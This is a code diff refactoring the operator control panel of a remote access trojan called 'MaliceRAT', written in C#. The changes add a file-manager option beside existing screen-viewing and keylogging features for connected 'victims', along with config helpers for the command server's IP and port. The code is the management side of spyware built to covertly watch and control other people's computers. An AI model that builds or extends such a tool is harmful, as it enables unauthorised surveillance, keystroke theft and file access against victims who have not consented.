@@ -23,7 +23,7 @@ namespace MaliceRAT
             InitializeConfig();
 
             server.StartServer();
-            server.InfoReceived += Server_InfoReceived;
+            server.systemInformation.InfoReceived += Server_InfoReceived;
             server.ClientDisconnected += Server_ClientDisconnected;
         }
         #region Config
@@ -39,6 +39,14 @@ namespace MaliceRAT
                 string newConfigJson = serializer.Serialize(config);
                 File.WriteAllText(configPath, newConfigJson);
             }
+        }
+        private string getConfigKey(string key)
+        {
+            string configPath = Path.Combine(Application.StartupPath, "config.json");
+            string configJson = File.ReadAllText(configPath);
+            var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
+            dynamic config = serializer.Deserialize<dynamic>(configJson);
+            return config[key].ToString();
         }
 
         private void InitializeConfig()
@@ -165,6 +173,12 @@ namespace MaliceRAT
             gunaBuildPath.Text = msbuildPath;
             gunaProjPath.Text = projPath;
             
+            gunaHostIP.Text = getConfigKey("server_ip");
+            gunaHostPort.Text = getConfigKey("server_port");
+        }
+
+        private void gunaLAN_Click(object sender, EventArgs e)
+        {
             gunaHostIP.Text = Utilities.GetLanIp();
             setConfigKey("server_ip", gunaHostIP.Text);
         }
@@ -275,13 +289,13 @@ namespace MaliceRAT
         #endregion
 
         #region Server events
-        private async void Server_InfoReceived(Victim client) 
+        private async void Server_InfoReceived(Victim victim) 
         {
-            await AddVictimToGrid(client);
+            await AddVictimToGrid(victim);
         }
-        private void Server_ClientDisconnected(Victim client) 
+        private void Server_ClientDisconnected(Victim victim) 
         {
-            RemoveVictimFromGrid(client);
+            RemoveVictimFromGrid(victim);
         }
         #endregion
 
@@ -306,35 +320,32 @@ namespace MaliceRAT
         private void InitializeContextMenu()
         {
             ContextMenuStrip victimContextMenu = new ContextMenuStrip();
+            var menuItems = new[]
+            {
+                ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click),
+                ContextMenuUtilities.CreateContextMenuItem("Key Logger", KeyLogger_Click),
+                ContextMenuUtilities.CreateContextMenuItem("File Manager", FileManager_Click),
+                ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click)
+            };
 
-            ToolStripMenuItem viewScreenItem = ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click);
-            ToolStripMenuItem keyLoggerItem = ContextMenuUtilities.CreateContextMenuItem("Key Logger", KeyLogger_Click);
-            ToolStripMenuItem disconnectItem = ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click);
-            
-            victimContextMenu.Items.AddRange(new ToolStripItem[] { viewScreenItem, keyLoggerItem, disconnectItem });
-
+            victimContextMenu.Items.AddRange(menuItems);
             gunaVictimsTable.ContextMenuStrip = victimContextMenu;
-            gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
+            gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaTable_MouseDown(sender, e, gunaVictimsTable);
         }
 
         private void ViewScreen_Click(object sender, EventArgs e)
         {
-            var id = GetSelectedId();
-            if (id.HasValue)
-            {
-                ScreenViewForm screenViewForm = new ScreenViewForm(id.Value, server);
-                screenViewForm.Show();
-            }
+            OpenFormIfIdExists<ScreenViewForm>(id => new ScreenViewForm(id, server));
         }
 
         private void KeyLogger_Click(object sender, EventArgs e)
         {
-            var id = GetSelectedId();
-            if (id.HasValue)
-            {
-                KeyLoggerForm keyLoggerForm = new KeyLoggerForm(id.Value, server);
-                keyLoggerForm.Show();
-            }
+            OpenFormIfIdExists<KeyLoggerForm>(id => new KeyLoggerForm(id, server));
+        }
+
+        private void FileManager_Click(object sender, EventArgs e)
+        {
+            OpenFormIfIdExists<FileManagerForm>(id => new FileManagerForm(id, server));
         }
 
         private void Disconnect_Click(object sender, EventArgs e)
@@ -343,6 +354,16 @@ namespace MaliceRAT
             if (id.HasValue)
             {
                 server.GetVictimById(id.Value).Disconnect();
+            }
+        }
+
+        private void OpenFormIfIdExists<T>(Func<int, Form> formCreator) where T : Form
+        {
+            var id = GetSelectedId();
+            if (id.HasValue)
+            {
+                var form = formCreator(id.Value);
+                form.Show();
             }
         }
         #endregion
